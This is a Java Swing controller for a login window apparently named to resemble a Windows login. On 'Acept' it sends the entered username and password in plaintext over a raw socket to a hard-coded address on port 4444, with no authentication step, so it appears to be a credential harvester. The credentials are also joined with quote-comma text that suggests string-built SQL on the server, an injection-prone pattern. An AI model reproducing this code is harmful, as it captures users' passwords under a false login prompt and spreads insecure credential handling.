package User_Login;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataOutputStream;
import java.net.Socket;
import javax.swing.JOptionPane;

public class ControllerSesionUser implements ActionListener {

    private Login_Windows_User object;
    private String ip = "192.168.56.1";
    private int port = 4444;

    public ControllerSesionUser(Login_Windows_User object) {
        this.object = object;
    }

    @Override
    public void actionPerformed(ActionEvent ae) {
        switch (ae.getActionCommand()) {
            case "Acept":
                try {
                    if (!this.GetUser().equals("") && !this.GetPass().equals("")) {
                        Socket cli = new Socket(ip, port);
                        DataOutputStream flujo = new DataOutputStream(cli.getOutputStream());
                        flujo.writeUTF(this.GetUser() + "', '" + this.GetPass());
                        cli.close();
                    } else {
                        JOptionPane.showMessageDialog(null, "Verifica los datos de usuario o contraseña", "", JOptionPane.ERROR_MESSAGE);
                    }
                } catch (Exception ex) {
                    System.out.println("Error al tratar de conectar " + ex.getMessage());
                }
                break;
            case "Cancel":
                System.exit(0);
                break;
        }
    }

    public String GetUser() {
        return this.object.User.getText();
    }

    public String GetPass() {
        return this.object.password.getText();
    }
}
